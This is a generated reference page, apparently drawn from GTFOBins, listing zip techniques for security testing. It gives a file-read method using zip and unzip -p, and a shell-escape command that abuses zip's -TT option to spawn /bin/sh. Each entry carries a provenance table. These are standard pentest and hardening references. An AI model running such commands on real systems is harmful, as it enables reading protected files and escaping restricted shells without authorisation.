---
parsed_by: focuslocust
source: commands
type: generated
---
# zip Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## zip

Tool page: [zip](../../tools/linux/zip.md)

### file-read

```text
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zip` |
| Evidence | Function example preserved from source parser. |

### shell

```text
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zip` |
| Evidence | Function example preserved from source parser. |
